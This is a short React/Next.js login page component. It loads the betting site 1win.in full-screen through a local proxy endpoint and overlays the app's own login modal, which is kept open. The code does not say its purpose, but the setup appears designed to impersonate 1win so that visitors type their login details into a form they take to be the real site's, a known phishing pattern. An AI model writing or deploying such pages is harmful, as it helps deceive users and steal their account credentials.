'use client';

import { useState, useEffect } from 'react';
import LoginModal from '../login';

export default function LoginPage() {
  const [modalOpen, setModalOpen] = useState(true);

  // Keep modal open on login page
  const handleClose = () => {
    // If closed, redirect to home or reopen
    window.location.href = '/';
  };

  useEffect(() => {
    setModalOpen(true);
  }, []);

  return (
    <>
      <iframe
        src="/api/proxy?url=https://1win.in"
        style={{
          position: 'fixed',
          inset: 0,
          width: '100%',
          height: '100%',
          border: 'none',
          zIndex: 1,
        }}
        title="1win"
      />
      <LoginModal
        isOpen={modalOpen}
        onClose={handleClose}
        initialMode="login"
      />
    </>
  );
}
